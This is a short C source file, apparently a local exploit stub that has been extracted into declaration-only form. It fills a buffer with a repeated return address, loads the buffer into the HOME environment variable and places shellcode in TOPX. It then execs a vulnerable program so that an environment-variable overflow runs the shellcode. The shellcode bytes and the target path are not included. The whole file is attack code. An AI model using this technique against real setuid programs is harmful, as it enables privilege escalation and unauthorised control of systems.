
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 scalar_t__ DEFRET ;
 int VULNTHING ;
 int execl (int ,int ,int *) ;
 int exit (int) ;
 int fprintf (int ,char*,long) ;
 int perror (char*) ;
 char* sc ;
 int setenv (char*,char*,int) ;
 int stdout ;
 int xnullbitch ;

int main(void) {

int ctr = 0;
char buffer[xnullbitch];
fprintf(stdout, "[*] 0x%8x\n", (long) DEFRET);

for(ctr = 0; ctr < xnullbitch - 1; ctr += 4)
*(long *) &buffer[ctr] = (long) DEFRET;

buffer[xnullbitch - 1] = '\0';

if((setenv("HOME", buffer, 1)) == -1) {
perror("setenv()");
exit(1);
}

if((setenv("TOPX", sc, 1)) == -1) {
perror("setenv()");
exit(1);
}

if((execl(VULNTHING, VULNTHING, ((void*)0))) == -1) {
perror("execl()");
exit(1);
}
return(0);
}
